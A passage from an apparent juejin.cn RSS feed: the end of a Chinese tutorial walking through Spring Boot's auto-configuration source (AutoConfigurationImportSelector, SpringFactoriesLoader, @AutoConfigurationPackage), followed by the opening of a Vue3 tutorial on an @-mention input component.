</code></pre>
<p><code>AutoConfigurationImportSelector</code> 类实现了 <code>DeferredImportSelector</code> 接口，它的 <code>selectImports</code> 方法会返回所有需要被加载的自动配置类的全限定名。</p>
<h4 data-id="heading-41">6.3.2 selectImports 方法</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> String[] selectImports(AnnotationMetadata annotationMetadata) {
    <span class="hljs-keyword">if</span> (!isEnabled(annotationMetadata)) {
        <span class="hljs-keyword">return</span> NO_IMPORTS;
    }
    <span class="hljs-type">AutoConfigurationEntry</span> <span class="hljs-variable">autoConfigurationEntry</span> <span class="hljs-operator">=</span> getAutoConfigurationEntry(annotationMetadata);
    <span class="hljs-keyword">return</span> StringUtils.toStringArray(autoConfigurationEntry.getConfigurations());
}

<span class="hljs-keyword">protected</span> AutoConfigurationEntry <span class="hljs-title function_">getAutoConfigurationEntry</span><span class="hljs-params">(AnnotationMetadata annotationMetadata)</span> {
    <span class="hljs-keyword">if</span> (!isEnabled(annotationMetadata)) {
        <span class="hljs-keyword">return</span> EMPTY_ENTRY;
    }
    <span class="hljs-type">AnnotationAttributes</span> <span class="hljs-variable">attributes</span> <span class="hljs-operator">=</span> getAttributes(annotationMetadata);
    <span class="hljs-comment">// 获取候选配置类列表</span>
    List&lt;String&gt; configurations = getCandidateConfigurations(annotationMetadata, attributes);
    <span class="hljs-comment">// 去重</span>
    configurations = removeDuplicates(configurations);
    <span class="hljs-comment">// 获取排除的配置类</span>
    Set&lt;String&gt; exclusions = getExclusions(annotationMetadata, attributes);
    <span class="hljs-comment">// 检查排除的配置类是否有效</span>
    checkExcludedClasses(configurations, exclusions);
    <span class="hljs-comment">// 移除排除的配置类</span>
    configurations.removeAll(exclusions);
    <span class="hljs-comment">// 过滤（条件注解）</span>
    configurations = getConfigurationClassFilter().filter(configurations);
    <span class="hljs-comment">// 触发自动配置导入事件</span>
    fireAutoConfigurationImportEvents(configurations, exclusions);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AutoConfigurationEntry</span>(configurations, exclusions);
}
</code></pre>
<p>这个方法首先会从 <code>META-INF/spring.factories</code> 文件中加载自动配置类，然后从 <code>META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports</code> 文件中加载自动配置类，并返回合并后的自动配置类列表。</p>
<h3 data-id="heading-42">6.4 SpringFactoriesLoader 工具类</h3>
<h4 data-id="heading-43">6.4.1 核心作用</h4>
<p><code>AutoConfigurationImportSelector</code> 是如何读取类路径中的 jar 包中的 <code>spring.factories</code> 文件？通过 <code>SpringFactoriesLoader</code> 工具类：</p>
<p><strong>核心作用</strong>：从 classpath 下所有 <code>META-INF/spring.factories</code> 文件中，根据指定的「接口/注解类型」，加载对应的「实现类/配置类全限定名列表」。</p>
<p><strong>不止用于自动配置</strong>：还能加载 <code>ApplicationContextInitializer</code>（上下文初始化器）、<code>ApplicationListener</code>（应用监听器）、<code>Converter</code>（类型转换器）等，是 Spring 生态中「SPI（服务发现）机制」的核心实现。</p>
<p><strong>仅做"加载列表"</strong>：不做筛选、不做导入，只负责读取文件内容，返回类名列表，交给调用者后续处理。</p>
<h4 data-id="heading-44">6.4.2 核心方法</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringFactoriesLoader</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FACTORIES_RESOURCE_LOCATION</span> <span class="hljs-operator">=</span> <span class="hljs-string">"META-INF/spring.factories"</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; List&lt;T&gt; <span class="hljs-title function_">loadFactories</span><span class="hljs-params">(Class&lt;T&gt; factoryType, <span class="hljs-meta">@Nullable</span> ClassLoader classLoader)</span> {
        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoaderToUse</span> <span class="hljs-operator">=</span> classLoader;
        <span class="hljs-keyword">if</span> (classLoaderToUse == <span class="hljs-literal">null</span>) {
            classLoaderToUse = SpringFactoriesLoader.class.getClassLoader();
        }
        List&lt;String&gt; factoryNames = loadFactoryNames(factoryType, classLoaderToUse);
        <span class="hljs-keyword">if</span> (logger.isTraceEnabled()) {
            logger.trace(<span class="hljs-string">"Loaded ["</span> + factoryType.getName() + <span class="hljs-string">"] names: "</span> + factoryNames);
        }
        List&lt;T&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(factoryNames.size());
        <span class="hljs-keyword">for</span> (String factoryName : factoryNames) {
            result.add(instantiateFactory(factoryName, factoryType, classLoaderToUse));
        }
        AnnotationAwareOrderComparator.sort(result);
        <span class="hljs-keyword">return</span> result;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;String&gt; <span class="hljs-title function_">loadFactoryNames</span><span class="hljs-params">(Class&lt;?&gt; factoryType, <span class="hljs-meta">@Nullable</span> ClassLoader classLoader)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">factoryTypeName</span> <span class="hljs-operator">=</span> factoryType.getName();
        <span class="hljs-keyword">return</span> loadSpringFactories(classLoaderToUse).getOrDefault(factoryTypeName, Collections.emptyList());
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;String, List&lt;String&gt;&gt; <span class="hljs-title function_">loadSpringFactories</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> ClassLoader classLoader)</span> {
        Map&lt;String, List&lt;String&gt;&gt; result = cache.get(classLoader);
        <span class="hljs-keyword">if</span> (result != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> result;
        }
        
        result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 加载所有 META-INF/spring.factories 文件</span>
            Enumeration&lt;URL&gt; urls = (classLoader != <span class="hljs-literal">null</span> ?
                classLoader.getResources(FACTORIES_RESOURCE_LOCATION) :
                ClassLoader.getSystemResources(FACTORIES_RESOURCE_LOCATION));
            <span class="hljs-keyword">while</span> (urls.hasMoreElements()) {
                <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> urls.nextElement();
                <span class="hljs-type">UrlResource</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UrlResource</span>(url);
                <span class="hljs-type">Properties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> PropertiesLoaderUtils.loadProperties(resource);
                <span class="hljs-keyword">for</span> (Map.Entry&lt;?, ?&gt; entry : properties.entrySet()) {
                    <span class="hljs-type">String</span> <span class="hljs-variable">factoryTypeName</span> <span class="hljs-operator">=</span> ((String) entry.getKey()).trim();
                    String[] factoryImplementationNames =
                        StringUtils.commaDelimitedListToStringArray((String) entry.getValue());
                    <span class="hljs-keyword">for</span> (String factoryImplementationName : factoryImplementationNames) {
                        result.computeIfAbsent(factoryTypeName, key -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;())
                            .add(factoryImplementationName.trim());
                    }
                }
            }
            
            <span class="hljs-comment">// 替换所有列表，使其不可修改</span>
            result.replaceAll((k, v) -&gt; Collections.unmodifiableList(v));
            cache.put(classLoader, result);
        } <span class="hljs-keyword">catch</span> (IOException ex) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"Unable to load factories from location ["</span> +
                FACTORIES_RESOURCE_LOCATION + <span class="hljs-string">"]"</span>, ex);
        }
        <span class="hljs-keyword">return</span> result;
    }
}
</code></pre>
<p><strong>例如</strong>：传入 <code>EnableAutoConfiguration.class</code>，就返回所有 <code>spring.factories</code> 中 <code>org.springframework.boot.autoconfigure.EnableAutoConfiguration=</code> 对应的类名列表。</p>
<h3 data-id="heading-45">6.5 自动配置的核心流程</h3>
<h4 data-id="heading-46">6.5.1 完整流程</h4>
<ol>
<li>
<p><strong>触发入口</strong>：用户应用标注 <code>@SpringBootApplication</code>，其内部包含 <code>@EnableAutoConfiguration</code> 注解</p>
</li>
<li>
<p><strong>导入选择器</strong>：<code>@EnableAutoConfiguration</code> 注解通过 <code>@Import(AutoConfigurationImportSelector.class)</code>，将该选择器注册到 Spring 容器</p>
</li>
<li>
<p><strong>工具加载候选列表</strong>：Spring 容器解析配置类时，调用 <code>AutoConfigurationImportSelector.selectImports()</code> 方法，该方法内部直接调用 <code>SpringFactoriesLoader.loadFactoryNames(EnableAutoConfiguration.class, classLoader)</code>，读取所有 <code>META-INF/spring.factories</code> 中声明的自动配置类名（如 <code>RedisAutoConfiguration</code>、<code>DataSourceAutoConfiguration</code> 等）</p>
</li>
<li>
<p><strong>筛选与排序</strong>：<code>AutoConfigurationImportSelector</code> 对候选列表做 3 件事：</p>
<ul>
<li><strong>排除</strong>：根据用户配置的 <code>spring.autoconfigure.exclude</code> 或 <code>@EnableAutoConfiguration(exclude)</code> 剔除指定类</li>
<li><strong>条件过滤</strong>：通过 <code>AutoConfigurationMetadata</code> 检查每个自动配置类的 <code>@Conditional</code> 注解（如 <code>@ConditionalOnClass</code> 检查依赖是否存在、<code>@ConditionalOnMissingBean</code> 检查用户是否自定义了 Bean），剔除不满足条件的类</li>
<li><strong>排序</strong>：按 <code>@AutoConfigureOrder</code> 注解或类名排序，确保依赖类先加载（如 <code>DataSourceAutoConfiguration</code> 先于 <code>JdbcTemplateAutoConfiguration</code>）</li>
</ul>
</li>
<li>
<p><strong>导入容器</strong>：<code>AutoConfigurationImportSelector</code> 将筛选后的最终列表返回给 Spring 容器，Spring 会将这些类作为 <code>@Configuration</code> 类解析，注册其内部定义的 Bean（如 <code>RedisTemplate</code>、<code>DataSource</code> 等）</p>
</li>
</ol>
<h4 data-id="heading-47">6.5.2 条件注解示例</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@ConditionalOnClass({RedisOperations.class})</span>
<span class="hljs-meta">@EnableConfigurationProperties(RedisProperties.class)</span>
<span class="hljs-meta">@Import({LettuceConnectionConfiguration.class, JedisConnectionConfiguration.class})</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisAutoConfiguration</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-meta">@ConditionalOnMissingBean(name = "redisTemplate")</span>
    <span class="hljs-keyword">public</span> RedisTemplate&lt;Object, Object&gt; <span class="hljs-title function_">redisTemplate</span><span class="hljs-params">(RedisConnectionFactory redisConnectionFactory)</span> {
        RedisTemplate&lt;Object, Object&gt; template = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisTemplate</span>&lt;&gt;();
        template.setConnectionFactory(redisConnectionFactory);
        <span class="hljs-keyword">return</span> template;
    }
}
</code></pre>
<p><strong>条件注解说明</strong>：</p>
<ul>
<li><code>@ConditionalOnClass</code>：当类路径中存在指定类时才生效</li>
<li><code>@ConditionalOnMissingBean</code>：当容器中不存在指定 Bean 时才创建</li>
</ul>
<h2 data-id="heading-48">七、@AutoConfigurationPackage 注解详解</h2>
<h3 data-id="heading-49">7.1 注解定义</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Target(ElementType.TYPE)</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-meta">@Documented</span>
<span class="hljs-meta">@Inherited</span>
<span class="hljs-meta">@Import(AutoConfigurationPackages.Registrar.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> AutoConfigurationPackage {
    String[] basePackages() <span class="hljs-keyword">default</span> {};
    
    Class&lt;?&gt;[] basePackageClasses() <span class="hljs-keyword">default</span> {};
}
</code></pre>
<h3 data-id="heading-50">7.2 核心作用</h3>
<p><code>@AutoConfigurationPackage</code> 是 Spring Boot 自动配置机制的核心注解之一，核心作用是：将用户应用的「主程序所在包」注册为「自动配置包」，为后续自动配置类（如 MyBatis、Spring Data JPA 等）提供「默认扫描范围」——简单说，它是给自动配置类"划定边界"，让自动配置能精准找到用户自定义的 Bean（如 <code>@Controller</code>、<code>@Service</code>、<code>@Repository</code> 等）。</p>
<h3 data-id="heading-51">7.3 归属和触发时机</h3>
<p><code>@AutoConfigurationPackage</code> 是 <code>@SpringBootApplication</code> 注解的组成部分（通过元注解组合），也就是说：当你在主程序类上标注 <code>@SpringBootApplication</code> 时，就默认启用了 <code>@AutoConfigurationPackage</code>。</p>
<p><strong>触发时机</strong>：和 <code>@EnableAutoConfiguration</code> 同步，在 Spring 容器解析 <code>@SpringBootApplication</code> 注解时，通过 <code>@Import</code> 加载 <code>Registrar</code> 组件，执行包路径注册。</p>
<h3 data-id="heading-52">7.4 实际应用场景</h3>
<h4 data-id="heading-53">7.4.1 MyBatis 自动扫描 Mapper 接口</h4>
<p>MyBatis 的自动配置类 <code>MyBatisAutoConfiguration</code> 中，会通过 <code>@MapperScan</code> 扫描 Mapper 接口，但如果用户没手动指定 <code>basePackages</code>，MyBatis 就会默认使用 <code>@AutoConfigurationPackage</code> 注册的包路径——所以你不用写 <code>@MapperScan("com.example.demo.mapper")</code>，只要 Mapper 接口和主程序在同一个包（或子包）下，就能被自动扫描到。</p>
<h4 data-id="heading-54">7.4.2 Spring Data JPA 自动扫描 Repository 接口</h4>
<p>同理，Spring Data JPA 的 <code>JpaRepositoriesAutoConfiguration</code> 会默认扫描 <code>@AutoConfigurationPackage</code> 注册的包下的 <code>@Repository</code> 接口，无需手动配置扫描路径。</p>
<p><strong>简单说</strong>：<code>@AutoConfigurationPackage</code> 替你"告诉"所有自动配置类：用户的自定义组件在哪个包下，你直接去这儿扫就行！</p>
<h3 data-id="heading-55">7.5 工作原理：AutoConfigurationPackages.Registrar</h3>
<h4 data-id="heading-56">7.5.1 Registrar 源码分析</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Registrar</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ImportBeanDefinitionRegistrar</span>, DeterminableImports {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerBeanDefinitions</span><span class="hljs-params">(AnnotationMetadata metadata, BeanDefinitionRegistry registry)</span> {
        register(registry, <span class="hljs-keyword">new</span> <span class="hljs-title class_">PackageImports</span>(metadata).getPackageNames().toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">0</span>]));
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Set&lt;Object&gt; <span class="hljs-title function_">determineImports</span><span class="hljs-params">(AnnotationMetadata metadata)</span> {
        <span class="hljs-keyword">return</span> Collections.singleton(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PackageImports</span>(metadata));
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">register</span><span class="hljs-params">(BeanDefinitionRegistry registry, String... packageNames)</span> {
    <span class="hljs-keyword">if</span> (registry.containsBeanDefinition(BEAN)) {
        <span class="hljs-type">BeanDefinition</span> <span class="hljs-variable">beanDefinition</span> <span class="hljs-operator">=</span> registry.getBeanDefinition(BEAN);
        <span class="hljs-type">ConstructorArgumentValues</span> <span class="hljs-variable">constructorArguments</span> <span class="hljs-operator">=</span> beanDefinition.getConstructorArgumentValues();
        constructorArguments.addIndexedArgumentValue(<span class="hljs-number">0</span>, addBasePackages(constructorArguments, packageNames));
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-type">GenericBeanDefinition</span> <span class="hljs-variable">beanDefinition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericBeanDefinition</span>();
        beanDefinition.setBeanClass(BasePackages.class);
        beanDefinition.getConstructorArgumentValues().addIndexedArgumentValue(<span class="hljs-number">0</span>, packageNames);
        beanDefinition.setRole(BeanDefinition.ROLE_INFRASTRUCTURE);
        registry.registerBeanDefinition(BEAN, beanDefinition);
    }
}
</code></pre>
<h4 data-id="heading-57">7.5.2 工作流程</h4>
<ol>
<li>
<p><strong>获取主程序包路径</strong>：Spring 启动时，<code>Registrar</code> 会通过 <code>AnnotationMetadata</code>（注解元数据），获取到标注了 <code>@AutoConfigurationPackage</code> 的类（也就是你的主程序类，如 <code>DemoApplication</code>）的包名（比如 <code>com.example.demo</code>）。</p>
</li>
<li>
<p><strong>注册包路径为 Spring Bean</strong>：<code>Registrar</code> 会将这个包名注册成一个特殊的 Spring Bean（类型为 <code>BasePackagesBeanDefinition</code>），本质是把包路径"记录"到 Spring 容器中。</p>
</li>
<li>
<p><strong>自动配置类读取包路径</strong>：后续的自动配置类（如 MyBatis、JPA 的自动配置），会通过 <code>AutoConfigurationPackages.get(ApplicationContext)</code> 方法，从 Spring 容器中获取到这个包路径，作为自己的默认扫描范围。</p>
</li>
</ol>
<h4 data-id="heading-58">7.5.3 获取包路径的方法</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;String&gt; <span class="hljs-title function_">get</span><span class="hljs-params">(BeanFactory beanFactory)</span> {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">return</span> beanFactory.getBean(BEAN, BasePackages.class).get();
    } <span class="hljs-keyword">catch</span> (NoSuchBeanDefinitionException ex) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"Unable to retrieve @AutoConfigurationPackage base packages"</span>, ex);
    }
}
</code></pre>
<h2 data-id="heading-59">八、@SpringBootApplication 完整执行流程总结</h2>
<h3 data-id="heading-60">启动流程时序图</h3>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> Spring Boot 应用启动
   ↓
<span class="hljs-bullet">2.</span> 扫描 @SpringBootApplication 注解
   ↓
<span class="hljs-bullet">3.</span> 解析 @SpringBootConfiguration
<span class="hljs-bullet">   -</span> 创建配置类代理（proxyBeanMethods=true）
   ↓
<span class="hljs-bullet">4.</span> 解析 @ComponentScan
<span class="hljs-bullet">   -</span> 扫描指定包下的组件
<span class="hljs-bullet">   -</span> TypeExcludeFilter 排除自定义类型
<span class="hljs-bullet">   -</span> AutoConfigurationExcludeFilter 排除自动配置类
<span class="hljs-bullet">   -</span> 注册 @Component 及其派生注解的类为 Bean
   ↓
<span class="hljs-bullet">5.</span> 解析 @EnableAutoConfiguration
   ↓
<span class="hljs-bullet">6.</span> 执行 @AutoConfigurationPackage
<span class="hljs-bullet">   -</span> AutoConfigurationPackages.Registrar 注册主程序包路径
   ↓
<span class="hljs-bullet">7.</span> 执行 AutoConfigurationImportSelector.selectImports()
<span class="hljs-bullet">   -</span> SpringFactoriesLoader 加载所有 spring.factories 中的自动配置类
<span class="hljs-bullet">   -</span> 条件注解过滤（@ConditionalOnClass 等）
<span class="hljs-bullet">   -</span> 排除用户指定的类
<span class="hljs-bullet">   -</span> 排序（@AutoConfigureOrder）
   ↓
<span class="hljs-bullet">8.</span> Spring 容器加载筛选后的自动配置类
   ↓
<span class="hljs-bullet">9.</span> 自动配置类注册 Bean 到容器
   ↓
<span class="hljs-bullet">10.</span> 应用启动完成
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从 0 到 1 实现一个支持 @ 提及用户的输入框组件（Vue3 实战）]]></title>    <link>https://juejin.cn/post/7574699340679954441</link>    <guid>https://juejin.cn/post/7574699340679954441</guid>    <pubDate>2025-11-21T03:33:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574699340679954441" data-draft-id="7568297370153238543" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从 0 到 1 实现一个支持 @ 提及用户的输入框组件（Vue3 实战）"/> <meta itemprop="keywords" content="前端,Vue.js"/> <meta itemprop="datePublished" content="2025-11-21T03:33:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="嘻嘻哈哈猿人"/> <meta itemprop="url" content="https://juejin.cn/user/4019470243215949"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从 0 到 1 实现一个支持 @ 提及用户的输入框组件（Vue3 实战）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4019470243215949/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    嘻嘻哈哈猿人
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T03:33:23.000Z" title="Fri Nov 21 2025 03:33:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">🎯 核心功能</h3>
<p>这是一个支持 @提及 的编辑器组件，类似于微博、企业微信等应用中的 @提及用户 功能，当用户在输入框中输入 “@” 时，自动弹出一个用户列表，可通过键盘或鼠标选择用户，被选中后插入到输入框中。</p>
<h2 data-id="heading-1">一、功能演示</h2>
<h3 data-id="heading-2">1.1 使用效果</h3>
<p>用户输入：实现 @远道而来点个赞 提及成员 @远道而来收入囊中</p>
<p>↓</p>
<p>实际存储：</p>
<pre><code class="hljs language-实际存储json" lang="实际存储json">[
  { type: 'text', content: '实现 ' },
  { type: 'user', content: '远道而来点个赞', id: '123' },
  { type: 'text', content: ' 提及成员 ' },
  { type: 'user', content: '远道而来收入囊中', id: '456' },
]
</code></pre>
<h3 data-id="heading-3">1.2 核心交互流程</h3>
<pre><code class="hljs language-交互流程" lang="交互流程">┌──────────────┐  
|  用户输入 @   ｜
└──────┬───────┘  
       ↓  
┌──────────────────────┐  
｜ 弹出下拉选择框         |
｜ （跟随光标位置）       |
└──────┬───────────────┘  
       ↓  
┌──────────────────────┐  
｜搜索 / 选择内容        ｜
└──────┬───────────────┘  
       ↓  
┌──────────────────────┐  
| 插入蓝色高亮标签        |
|（不可编辑的 span）     |
└──────────────────────┘ 
</code></pre>
<h3 data-id="heading-4">1.3 📺演示效果</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e73682cc912f4a95adbaa57bd5e6786a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zi75Zi75ZOI5ZOI54y_5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764300802&amp;x-signature=VD5gt%2FxlX%2FQTXicmLv7mL3ikFyU%3D" alt="录屏.gif" loading="lazy"/></p>
<p>看完效果埋头苦干</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0343bdad8b9a482b894087c0148d22ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zi75Zi75ZOI5ZOI54y_5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764300802&amp;x-signature=khDgvCFhQ0H%2FpnCY%2F%2FiuBPGZLgA%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-5">🏗️ 架构组成</h3>
<h4 data-id="heading-6">1️⃣ MentionInput.vue（主编辑器）</h4>
<ul>
<li>基础能力：可编辑的 contenteditable 输入区域</li>
</ul>
